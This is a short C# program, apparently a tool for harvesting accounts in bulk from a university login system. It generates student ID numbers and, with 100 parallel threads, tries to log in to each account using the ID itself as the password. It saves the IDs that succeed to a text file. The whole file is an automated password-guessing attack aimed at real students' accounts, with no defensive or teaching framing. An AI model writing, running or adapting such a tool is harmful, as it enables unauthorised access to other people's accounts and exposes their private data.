using Request;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace ToolGetAccHangLoat
{
    class Program
    {
        static void Main(string[] args)
        {
            string headcode = "00";
            List<string> listAcc = Utility.Utility.GenerateAccount(headcode);
            List<string> Result = new List<string>();
            Parallel.ForEach(listAcc, new ParallelOptions()
            {
                MaxDegreeOfParallelism = 100
            }, (Mssv) =>
            {
                using (CheckLoginAndValidate vnu = new CheckLoginAndValidate())
                {
                    vnu.User = Mssv;
                    vnu.Pass = Mssv;
                    vnu.Begin();
                    if (vnu.IsSuccess)
                    {
                        Result.Add(vnu.User);
                    }
                }

            });
            Console.WriteLine($"{DateTime.Now} Done");
            Result.Reverse();
            File.WriteAllLines(headcode + ".txt", Result);
        }
    }
}
